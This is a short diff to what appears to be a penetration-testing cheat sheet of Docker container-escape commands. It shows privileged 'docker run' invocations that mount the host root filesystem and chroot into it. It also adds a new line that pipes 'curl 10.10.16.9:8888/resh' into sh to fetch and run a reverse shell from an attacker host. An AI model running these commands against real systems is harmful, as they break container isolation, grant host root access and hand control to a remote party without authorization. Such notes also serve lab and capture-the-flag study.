@@ -1304,7 +1304,11 @@ ls -la /var/tmp
 cat /etc/mtab | grep -oP 'upperdir.*' | cut -d ',' -f1
 docker ps -a
 docker commit 35c090009763 tempimg
-docker run -it --rm --privileged -v /:/mnt tempimg chroot /mnt sh
+docker run -v /:/mnt --rm --privileged -it tempimg chroot /mnt sh
+
++---------- Run Image Privileged ----------+
+docker image list
+docker run -v /:/mnt --rm --privileged REPOSITORY chroot /mnt bash -c 'curl 10.10.16.9:8888/resh|sh'
 
 +---------- Privileged: True ----------+
 cat docker-compose.yml | grep 'privileged: true'
